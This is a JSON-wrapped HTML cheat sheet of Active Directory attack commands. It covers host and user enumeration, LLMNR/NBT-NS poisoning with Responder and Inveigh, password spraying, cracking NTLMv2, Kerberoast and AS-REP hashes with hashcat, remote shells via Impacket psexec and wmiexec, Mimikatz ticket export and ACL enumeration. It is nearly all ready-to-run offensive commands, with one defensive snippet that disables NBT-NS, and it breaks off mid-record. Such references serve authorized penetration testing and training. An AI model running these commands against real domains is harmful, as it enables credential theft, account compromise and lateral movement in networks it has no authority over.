{"title": "Enumeration", "source": "active-directory", "source_label": "Active Directory", "path": "Active Directory/Enumeration", "html": "<h2 id=\"initial-enumeration\">Initial Enumeration</h2>\n<p>Passive and active techniques to discover hosts, services, and domain information before authentication.</p>\n<h3 id=\"dns-lookup\">DNS Lookup</h3>\n<p>Query DNS to discover IP-to-hostname mappings.</p>\n<div class=\"highlight\"><pre><span></span><code>nslookup<span class=\"w\"> </span>ns1.&lt;domain&gt;\n</code></pre></div>\n<h3 id=\"packet-capture\">Packet Capture</h3>\n<p>Capture traffic on the network interface to passively observe domain communications.</p>\n<div class=\"highlight\"><pre><span></span><code>sudo<span class=\"w\"> </span>tcpdump<span class=\"w\"> </span>-i<span class=\"w\"> </span>ens224\n</code></pre></div>\n<h3 id=\"responder-passive-analysis\">Responder Passive Analysis</h3>\n<p>Run Responder in analyze mode to observe LLMNR/NBT-NS/MDNS queries without poisoning.</p>\n<div class=\"highlight\"><pre><span></span><code>sudo<span class=\"w\"> </span>responder<span class=\"w\"> </span>-I<span class=\"w\"> </span>ens224<span class=\"w\"> </span>-A\n</code></pre></div>\n<h3 id=\"host-discovery-fping\">Host Discovery (fping)</h3>\n<p>Ping sweep a subnet to identify live hosts.</p>\n<div class=\"highlight\"><pre><span></span><code>fping<span class=\"w\"> </span>-asgq<span class=\"w\"> </span>&lt;subnet&gt;\n</code></pre></div>\n<h3 id=\"nmap-host-enumeration\">Nmap Host Enumeration</h3>\n<p>Full enumeration scan with OS detection, version detection, scripts, and traceroute against a host list.</p>\n<div class=\"highlight\"><pre><span></span><code>sudo<span class=\"w\"> </span>nmap<span class=\"w\"> </span>-v<span class=\"w\"> </span>-A<span class=\"w\"> </span>-iL<span class=\"w\"> </span>hosts.txt<span class=\"w\"> </span>-oN<span class=\"w\"> </span>/home/user/host-enum\n</code></pre></div>\n<h3 id=\"kerbrute-user-enumeration\">Kerbrute User Enumeration</h3>\n<p>Enumerate valid domain users without authentication using Kerberos pre-auth errors.</p>\n<div class=\"highlight\"><pre><span></span><code>kerbrute<span class=\"w\"> </span>userenum<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;DOMAIN&gt;<span class=\"w\"> </span>--dc<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>jsmith.txt<span class=\"w\"> </span>-o<span class=\"w\"> </span>kerb-results\n</code></pre></div>\n<hr />\n<h2 id=\"llmnrnbt-ns-poisoning\">LLMNR/NBT-NS Poisoning</h2>\n<p>Capture NTLMv2 hashes by poisoning name resolution requests on the network.</p>\n<h3 id=\"responder-linux\">Responder (Linux)</h3>\n<div class=\"highlight\"><pre><span></span><code>sudo<span class=\"w\"> </span>responder<span class=\"w\"> </span>-I<span class=\"w\"> </span>ens224\n</code></pre></div>\n<h3 id=\"crack-captured-ntlmv2-hash\">Crack Captured NTLMv2 Hash</h3>\n<div class=\"highlight\"><pre><span></span><code>hashcat<span class=\"w\"> </span>-m<span class=\"w\"> </span><span class=\"m\">5600</span><span class=\"w\"> </span>&lt;hash-file&gt;<span class=\"w\"> </span>/usr/share/wordlists/rockyou.txt\n</code></pre></div>\n<h3 id=\"inveigh-windows-powershell\">Inveigh (Windows - PowerShell)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Import-Module</span> <span class=\"p\">.\\</span><span class=\"n\">Inveigh</span><span class=\"p\">.</span><span class=\"n\">ps1</span>\n<span class=\"p\">(</span><span class=\"nb\">Get-Command</span> <span class=\"nb\">Invoke-Inveigh</span><span class=\"p\">).</span><span class=\"n\">Parameters</span>\n<span class=\"nb\">Invoke-Inveigh</span> <span class=\"n\">Y</span> <span class=\"n\">-NBNS</span> <span class=\"n\">Y</span> <span class=\"n\">-ConsoleOutput</span> <span class=\"n\">Y</span> <span class=\"n\">-FileOutput</span> <span class=\"n\">Y</span>\n</code></pre></div>\n<h3 id=\"inveigh-windows-c-binary\">Inveigh (Windows - C# binary)</h3>\n<div class=\"highlight\"><pre><span></span><code>.\\Inveigh.exe\n</code></pre></div>\n<h3 id=\"disable-nbt-ns-defenseverify\">Disable NBT-NS (Defense/Verify)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nv\">$regkey</span> <span class=\"p\">=</span> <span class=\"s2\">&quot;HKLM:SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces&quot;</span>\n<span class=\"nb\">Get-ChildItem</span> <span class=\"nv\">$regkey</span> <span class=\"p\">|</span> <span class=\"k\">foreach</span> <span class=\"p\">{</span> <span class=\"nb\">Set-ItemProperty</span> <span class=\"n\">-Path</span> <span class=\"s2\">&quot;$regkey\\</span><span class=\"p\">$(</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">pschildname</span><span class=\"p\">)</span><span class=\"s2\">&quot;</span> <span class=\"n\">-Name</span> <span class=\"n\">NetbiosOptions</span> <span class=\"n\">-Value</span> <span class=\"n\">2</span> <span class=\"n\">-Verbose</span> <span class=\"p\">}</span>\n</code></pre></div>\n<hr />\n<h2 id=\"password-policy-enumeration\">Password Policy Enumeration</h2>\n<p>Gather password policy details to inform spraying cadence and avoid lockouts.</p>\n<h3 id=\"cme-via-valid-creds\">CME via Valid Creds</h3>\n<div class=\"highlight\"><pre><span></span><code>crackmapexec<span class=\"w\"> </span>smb<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>--pass-pol\n</code></pre></div>\n<h3 id=\"rpcclient-null-session\">rpcclient NULL Session</h3>\n<div class=\"highlight\"><pre><span></span><code>rpcclient<span class=\"w\"> </span>-U<span class=\"w\"> </span><span class=\"s2\">&quot;&quot;</span><span class=\"w\"> </span>-N<span class=\"w\"> </span>&lt;dc-ip&gt;\nrpcclient<span class=\"w\"> </span>$&gt;<span class=\"w\"> </span>querydominfo\n</code></pre></div>\n<h3 id=\"enum4linux\">enum4linux</h3>\n<div class=\"highlight\"><pre><span></span><code>enum4linux<span class=\"w\"> </span>-P<span class=\"w\"> </span>&lt;dc-ip&gt;\nenum4linux-ng<span class=\"w\"> </span>-P<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-oA<span class=\"w\"> </span>ilfreight\n</code></pre></div>\n<h3 id=\"ldapsearch\">ldapsearch</h3>\n<div class=\"highlight\"><pre><span></span><code>ldapsearch<span class=\"w\"> </span>-h<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-x<span class=\"w\"> </span>-b<span class=\"w\"> </span><span class=\"s2\">&quot;DC=&lt;DOMAIN&gt;,DC=LOCAL&quot;</span><span class=\"w\"> </span>-s<span class=\"w\"> </span>sub<span class=\"w\"> </span><span class=\"s2\">&quot;*&quot;</span><span class=\"w\"> </span><span class=\"p\">|</span><span class=\"w\"> </span>grep<span class=\"w\"> </span>-m<span class=\"w\"> </span><span class=\"m\">1</span><span class=\"w\"> </span>-B<span class=\"w\"> </span><span class=\"m\">10</span><span class=\"w\"> </span>pwdHistoryLength\n</code></pre></div>\n<h3 id=\"net-accounts-windows\">net accounts (Windows)</h3>\n<div class=\"highlight\"><pre><span></span><code>net accounts\n</code></pre></div>\n<h3 id=\"powerview\">PowerView</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Import-Module</span> <span class=\"p\">.\\</span><span class=\"n\">PowerView</span><span class=\"p\">.</span><span class=\"n\">ps1</span>\n<span class=\"nb\">Get-DomainPolicy</span>\n</code></pre></div>\n<hr />\n<h2 id=\"user-enumeration-unauthenticated\">User Enumeration (Unauthenticated)</h2>\n<h3 id=\"enum4linux_1\">enum4linux</h3>\n<div class=\"highlight\"><pre><span></span><code>enum4linux<span class=\"w\"> </span>-U<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span><span class=\"p\">|</span><span class=\"w\"> </span>grep<span class=\"w\"> </span><span class=\"s2\">&quot;user:&quot;</span><span class=\"w\"> </span><span class=\"p\">|</span><span class=\"w\"> </span>cut<span class=\"w\"> </span>-f2<span class=\"w\"> </span>-d<span class=\"s2\">&quot;[&quot;</span><span class=\"w\"> </span><span class=\"p\">|</span><span class=\"w\"> </span>cut<span class=\"w\"> </span>-f1<span class=\"w\"> </span>-d<span class=\"s2\">&quot;]&quot;</span>\n</code></pre></div>\n<h3 id=\"rpcclient\">rpcclient</h3>\n<div class=\"highlight\"><pre><span></span><code>rpcclient<span class=\"w\"> </span>-U<span class=\"w\"> </span><span class=\"s2\">&quot;&quot;</span><span class=\"w\"> </span>-N<span class=\"w\"> </span>&lt;dc-ip&gt;\nrpcclient<span class=\"w\"> </span>$&gt;<span class=\"w\"> </span>enumdomusers\n</code></pre></div>\n<h3 id=\"crackmapexec\">CrackMapExec</h3>\n<div class=\"highlight\"><pre><span></span><code>crackmapexec<span class=\"w\"> </span>smb<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>--users\n</code></pre></div>\n<h3 id=\"ldapsearch_1\">ldapsearch</h3>\n<div class=\"highlight\"><pre><span></span><code>ldapsearch<span class=\"w\"> </span>-h<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-x<span class=\"w\"> </span>-b<span class=\"w\"> </span><span class=\"s2\">&quot;DC=&lt;DOMAIN&gt;,DC=LOCAL&quot;</span><span class=\"w\"> </span>-s<span class=\"w\"> </span>sub<span class=\"w\"> </span><span class=\"s2\">&quot;(&amp;(objectclass=user))&quot;</span><span class=\"w\"> </span><span class=\"p\">|</span><span class=\"w\"> </span>grep<span class=\"w\"> </span>sAMAccountName:<span class=\"w\"> </span><span class=\"p\">|</span><span class=\"w\"> </span>cut<span class=\"w\"> </span>-f2<span class=\"w\"> </span>-d<span class=\"s2\">&quot; &quot;</span>\n</code></pre></div>\n<h3 id=\"windapsearch\">windapsearch</h3>\n<div class=\"highlight\"><pre><span></span><code>./windapsearch.py<span class=\"w\"> </span>--dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&quot;</span><span class=\"w\"> </span>-U\n</code></pre></div>\n<hr />\n<h2 id=\"password-spraying\">Password Spraying</h2>\n<h3 id=\"rpcclient-one-liner\">rpcclient One-Liner</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"k\">for</span><span class=\"w\"> </span>u<span class=\"w\"> </span><span class=\"k\">in</span><span class=\"w\"> </span><span class=\"k\">$(</span>cat<span class=\"w\"> </span>valid_users.txt<span class=\"k\">)</span><span class=\"p\">;</span><span class=\"w\"> </span><span class=\"k\">do</span><span class=\"w\"> </span>rpcclient<span class=\"w\"> </span>-U<span class=\"w\"> </span><span class=\"s2\">&quot;</span><span class=\"nv\">$u</span><span class=\"s2\">%&lt;password&gt;&quot;</span><span class=\"w\"> </span>-c<span class=\"w\"> </span><span class=\"s2\">&quot;getusername;quit&quot;</span><span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span><span class=\"p\">|</span><span class=\"w\"> </span>grep<span class=\"w\"> </span>Authority<span class=\"p\">;</span><span class=\"w\"> </span><span class=\"k\">done</span>\n</code></pre></div>\n<h3 id=\"kerbrute\">kerbrute</h3>\n<div class=\"highlight\"><pre><span></span><code>kerbrute<span class=\"w\"> </span>passwordspray<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>--dc<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>valid_users.txt<span class=\"w\"> </span>&lt;password&gt;\n</code></pre></div>\n<h3 id=\"crackmapexec_1\">CrackMapExec</h3>\n<div class=\"highlight\"><pre><span></span><code>sudo<span class=\"w\"> </span>crackmapexec<span class=\"w\"> </span>smb<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>valid_users.txt<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span><span class=\"p\">|</span><span class=\"w\"> </span>grep<span class=\"w\"> </span>+\n</code></pre></div>\n<h3 id=\"validate-a-single-set-of-credentials\">Validate a Single Set of Credentials</h3>\n<div class=\"highlight\"><pre><span></span><code>sudo<span class=\"w\"> </span>crackmapexec<span class=\"w\"> </span>smb<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;\n</code></pre></div>\n<h3 id=\"local-auth-spray-avoid-lockout\">Local Auth Spray (avoid lockout)</h3>\n<div class=\"highlight\"><pre><span></span><code>sudo<span class=\"w\"> </span>crackmapexec<span class=\"w\"> </span>smb<span class=\"w\"> </span>--local-auth<span class=\"w\"> </span>&lt;subnet&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>administrator<span class=\"w\"> </span>-H<span class=\"w\"> </span>&lt;hash&gt;<span class=\"w\"> </span><span class=\"p\">|</span><span class=\"w\"> </span>grep<span class=\"w\"> </span>+\n</code></pre></div>\n<h3 id=\"domainpasswordspray-windows\">DomainPasswordSpray (Windows)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Import-Module</span> <span class=\"p\">.\\</span><span class=\"n\">DomainPasswordSpray</span><span class=\"p\">.</span><span class=\"n\">ps1</span>\n<span class=\"nb\">Invoke-DomainPasswordSpray</span> <span class=\"n\">-Password</span> <span class=\"p\">&lt;</span><span class=\"n\">password</span><span class=\"p\">&gt;</span> <span class=\"n\">-OutFile</span> <span class=\"n\">spray_success</span> <span class=\"n\">-ErrorAction</span> <span class=\"n\">SilentlyContinue</span>\n</code></pre></div>\n<hr />\n<h2 id=\"security-controls-enumeration\">Security Controls Enumeration</h2>\n<h3 id=\"check-windows-defender-status\">Check Windows Defender Status</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-MpComputerStatus</span>\n</code></pre></div>\n<h3 id=\"check-applocker-policies\">Check AppLocker Policies</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-AppLockerPolicy</span> <span class=\"n\">-Effective</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">-ExpandProperty</span> <span class=\"n\">RuleCollections</span>\n</code></pre></div>\n<h3 id=\"check-powershell-language-mode\">Check PowerShell Language Mode</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nv\">$ExecutionContext</span><span class=\"p\">.</span><span class=\"n\">SessionState</span><span class=\"p\">.</span><span class=\"n\">LanguageMode</span>\n</code></pre></div>\n<h3 id=\"laps-find-delegated-groups\">LAPS - Find Delegated Groups</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Find-LAPSDelegatedGroups</span>\n<span class=\"nb\">Find-AdmPwdExtendedRights</span>\n<span class=\"nb\">Get-LAPSComputers</span>\n</code></pre></div>\n<hr />\n<h2 id=\"credentialed-enumeration-linux\">Credentialed Enumeration (Linux)</h2>\n<h3 id=\"crackmapexec-usersgroupsshares\">CrackMapExec - Users/Groups/Shares</h3>\n<div class=\"highlight\"><pre><span></span><code>sudo<span class=\"w\"> </span>crackmapexec<span class=\"w\"> </span>smb<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>--users\nsudo<span class=\"w\"> </span>crackmapexec<span class=\"w\"> </span>smb<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>--groups\nsudo<span class=\"w\"> </span>crackmapexec<span class=\"w\"> </span>smb<span class=\"w\"> </span>&lt;target-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>--loggedon-users\nsudo<span class=\"w\"> </span>crackmapexec<span class=\"w\"> </span>smb<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>--shares\nsudo<span class=\"w\"> </span>crackmapexec<span class=\"w\"> </span>smb<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>spider_plus<span class=\"w\"> </span>--share<span class=\"w\"> </span>Dev-share\n</code></pre></div>\n<h3 id=\"smbmap\">smbmap</h3>\n<div class=\"highlight\"><pre><span></span><code>smbmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;DOMAIN&gt;<span class=\"w\"> </span>-H<span class=\"w\"> </span>&lt;dc-ip&gt;\nsmbmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;DOMAIN&gt;<span class=\"w\"> </span>-H<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-R<span class=\"w\"> </span>SYSVOL<span class=\"w\"> </span>--dir-only\n</code></pre></div>\n<h3 id=\"rpcclient-query-users\">rpcclient - Query Users</h3>\n<div class=\"highlight\"><pre><span></span><code>rpcclient<span class=\"w\"> </span>$&gt;<span class=\"w\"> </span>queryuser<span class=\"w\"> </span>0x457\nrpcclient<span class=\"w\"> </span>$&gt;<span class=\"w\"> </span>enumdomusers\n</code></pre></div>\n<h3 id=\"impacket-psexec-wmiexec\">Impacket psexec / wmiexec</h3>\n<div class=\"highlight\"><pre><span></span><code>psexec.py<span class=\"w\"> </span>&lt;domain&gt;/&lt;username&gt;:<span class=\"s1\">&#39;&lt;password&gt;&#39;</span>@&lt;target-ip&gt;\nwmiexec.py<span class=\"w\"> </span>&lt;domain&gt;/&lt;username&gt;:<span class=\"s1\">&#39;&lt;password&gt;&#39;</span>@&lt;dc-ip&gt;\n</code></pre></div>\n<h3 id=\"windapsearch-domain-admins\">windapsearch - Domain Admins</h3>\n<div class=\"highlight\"><pre><span></span><code>python3<span class=\"w\"> </span>windapsearch.py<span class=\"w\"> </span>--dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;domain&gt;<span class=\"se\">\\&lt;</span>username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>--da\npython3<span class=\"w\"> </span>windapsearch.py<span class=\"w\"> </span>--dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;domain&gt;<span class=\"se\">\\&lt;</span>username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-PU\n</code></pre></div>\n<h3 id=\"bloodhound-python-ingestor\">BloodHound Python Ingestor</h3>\n<div class=\"highlight\"><pre><span></span><code>sudo<span class=\"w\"> </span>bloodhound-python<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;username&gt;&#39;</span><span class=\"w\"> </span>-p<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>-ns<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>-c<span class=\"w\"> </span>all\n</code></pre></div>\n<hr />\n<h2 id=\"living-off-the-land-windows\">Living Off the Land (Windows)</h2>\n<p>Using built-in tools to avoid dropping tooling on disk.</p>\n<h3 id=\"active-directory-module\">Active Directory Module</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Import-Module</span> <span class=\"n\">ActiveDirectory</span>\n<span class=\"nb\">Get-ADDomain</span>\n<span class=\"nb\">Get-ADUser</span> <span class=\"n\">-Filter</span> <span class=\"p\">{</span><span class=\"n\">ServicePrincipalName</span> <span class=\"o\">-ne</span> <span class=\"s2\">&quot;$null&quot;</span><span class=\"p\">}</span> <span class=\"n\">-Properties</span> <span class=\"n\">ServicePrincipalName</span>\n<span class=\"nb\">Get-ADTrust</span> <span class=\"n\">-Filter</span> <span class=\"p\">*</span>\n<span class=\"nb\">Get-ADGroup</span> <span class=\"n\">-Filter</span> <span class=\"p\">*</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">name</span>\n<span class=\"nb\">Get-ADGroup</span> <span class=\"n\">-Identity</span> <span class=\"s2\">&quot;Backup Operators&quot;</span>\n<span class=\"nb\">Get-ADGroupMember</span> <span class=\"n\">-Identity</span> <span class=\"s2\">&quot;Backup Operators&quot;</span>\n</code></pre></div>\n<h3 id=\"snaffler-share-file-discovery\">Snaffler - Share File Discovery</h3>\n<p>Finds sensitive files in accessible shares.</p>\n<div class=\"highlight\"><pre><span></span><code>.\\Snaffler.exe -d &lt;DOMAIN&gt; -s -v data\n</code></pre></div>\n<hr />\n<h2 id=\"kerberoasting\">Kerberoasting</h2>\n<p>Request TGS tickets for accounts with SPNs set and crack them offline.</p>\n<h3 id=\"impacket-getuserspns-linux\">Impacket GetUserSPNs (Linux)</h3>\n<div class=\"highlight\"><pre><span></span><code>GetUserSPNs.py<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>&lt;DOMAIN&gt;/&lt;username&gt;\nGetUserSPNs.py<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>&lt;DOMAIN&gt;/&lt;username&gt;<span class=\"w\"> </span>-request\nGetUserSPNs.py<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>&lt;DOMAIN&gt;/&lt;username&gt;<span class=\"w\"> </span>-request-user<span class=\"w\"> </span>sqldev<span class=\"w\"> </span>-outputfile<span class=\"w\"> </span>sqldev_tgs\n</code></pre></div>\n<h3 id=\"crack-kerberoast-hash\">Crack Kerberoast Hash</h3>\n<div class=\"highlight\"><pre><span></span><code>hashcat<span class=\"w\"> </span>-m<span class=\"w\"> </span><span class=\"m\">13100</span><span class=\"w\"> </span>sqldev_tgs<span class=\"w\"> </span>/usr/share/wordlists/rockyou.txt<span class=\"w\"> </span>--force\n</code></pre></div>\n<h3 id=\"enumerate-spns-windows\">Enumerate SPNs (Windows)</h3>\n<div class=\"highlight\"><pre><span></span><code>setspn.exe -Q */*\nsetspn.exe -T &lt;DOMAIN&gt; -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }\n</code></pre></div>\n<h3 id=\"powerview-kerberoast\">PowerView Kerberoast</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Import-Module</span> <span class=\"p\">.\\</span><span class=\"n\">PowerView</span><span class=\"p\">.</span><span class=\"n\">ps1</span>\n<span class=\"nb\">Get-DomainUser</span> <span class=\"p\">*</span> <span class=\"n\">-spn</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">samaccountname</span>\n<span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-Identity</span> <span class=\"n\">sqldev</span> <span class=\"p\">|</span> <span class=\"nb\">Get-DomainSPNTicket</span> <span class=\"n\">-Format</span> <span class=\"n\">Hashcat</span>\n<span class=\"nb\">Get-DomainUser</span> <span class=\"p\">*</span> <span class=\"n\">-SPN</span> <span class=\"p\">|</span> <span class=\"nb\">Get-DomainSPNTicket</span> <span class=\"n\">-Format</span> <span class=\"n\">Hashcat</span> <span class=\"p\">|</span> <span class=\"nb\">Export-Csv</span> <span class=\"p\">.\\</span><span class=\"n\">tgs</span><span class=\"p\">.</span><span class=\"n\">csv</span> <span class=\"n\">-NoTypeInformation</span>\n</code></pre></div>\n<h3 id=\"rubeus-kerberoast\">Rubeus Kerberoast</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">kerberoast</span> <span class=\"p\">/</span><span class=\"n\">stats</span>\n<span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">kerberoast</span> <span class=\"p\">/</span><span class=\"n\">ldapfilter</span><span class=\"p\">:</span><span class=\"s1\">&#39;admincount=1&#39;</span> <span class=\"p\">/</span><span class=\"n\">nowrap</span>\n<span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">kerberoast</span> <span class=\"p\">/</span><span class=\"n\">user</span><span class=\"p\">:</span><span class=\"n\">testspn</span> <span class=\"p\">/</span><span class=\"n\">nowrap</span>\n</code></pre></div>\n<h3 id=\"mimikatz-extract-tickets\">Mimikatz - Extract Tickets</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">mimikatz</span> <span class=\"c\"># base64 /out:true</span>\n<span class=\"n\">kerberos</span><span class=\"p\">::</span><span class=\"n\">list</span> <span class=\"p\">/</span><span class=\"n\">export</span>\n</code></pre></div>\n<hr />\n<h2 id=\"asreproasting\">ASREPRoasting</h2>\n<p>Find accounts that don't require Kerberos pre-authentication and request their AS-REP hashes.</p>\n<h3 id=\"powerview-find-vulnerable-accounts\">PowerView - Find Vulnerable Accounts</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-PreauthNotRequired</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">samaccountname</span><span class=\"p\">,</span><span class=\"n\">userprincipalname</span><span class=\"p\">,</span><span class=\"n\">useraccountcontrol</span> <span class=\"p\">|</span> <span class=\"nb\">fl</span>\n</code></pre></div>\n<h3 id=\"rubeus\">Rubeus</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">asreproast</span> <span class=\"p\">/</span><span class=\"n\">user</span><span class=\"p\">:&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">nowrap</span> <span class=\"p\">/</span><span class=\"n\">format</span><span class=\"p\">:</span><span class=\"n\">hashcat</span>\n</code></pre></div>\n<h3 id=\"crack-asreproast-hash\">Crack ASREPRoast Hash</h3>\n<div class=\"highlight\"><pre><span></span><code>hashcat<span class=\"w\"> </span>-m<span class=\"w\"> </span><span class=\"m\">18200</span><span class=\"w\"> </span>asrep_hashes<span class=\"w\"> </span>/usr/share/wordlists/rockyou.txt\n</code></pre></div>\n<h3 id=\"kerbrute-enumerate-and-asrep-roast\">kerbrute - Enumerate and ASREP Roast</h3>\n<div class=\"highlight\"><pre><span></span><code>kerbrute<span class=\"w\"> </span>userenum<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>--dc<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>/opt/jsmith.txt\n</code></pre></div>\n<hr />\n<h2 id=\"acl-enumeration\">ACL Enumeration</h2>\n<h3 id=\"find-interesting-acls-powerview\">Find Interesting ACLs (PowerView)</h3>\n<p>Finds objects in the domain where non-built-in accounts have modification rights.</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Find-InterestingDomainAcl</span>\n</code></pre></div>\n<h3 id=\"get-acls-for-a-specific-users-sid\">Get ACLs for a Specific User's SID</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Import-Module</span> <span class=\"p\">.\\</span><span class=\"n\">PowerView</span><span class=\"p\">.</span><span class=\"n\">ps1</span>\n<span class=\"nv\">$sid</span> <span class=\"p\">=</span> <span class=\"nb\">Convert-NameToSid</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span>\n<span class=\"nb\">Get-DomainObjectACL</span> <span class=\"n\">-Identity</span> <span class=\"p\">*</span> <span class=\"p\">|</span> <span class=\"p\">?</span> <span class=\"p\">{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">SecurityIdentifier</span> <span class=\"o\">-eq</span> <span class=\"nv\">$sid</span><span class=\"p\">}</span>\n<span class=\"nb\">Get-DomainObjectACL</span> <span class=\"n\">-ResolveGUIDs</span> <span class=\"n\">-Identity</span> <span class=\"p\">*</span> <span class=\"p\">|</span> <span class=\"p\">?</span> <span class=\"p\">{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">SecurityIdentifier</span> <span class=\"o\">-eq</span> <span class=\"nv\">$sid</span><span class=\"p\">}</span>\n</code></pre></div>\n<h3 id=\"reverse-guid-lookup\">Reverse GUID Lookup</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nv\">$guid</span> <span class=\"p\">=</span> <span class=\"s2\">&quot;00299570-246d-11d0-a768-00aa006e0529&quot;</span>\n<span class=\"nb\">Get-ADObject</span> <span class=\"n\">-SearchBase</span> <span class=\"s2\">&quot;CN=Extended-Rights,</span><span 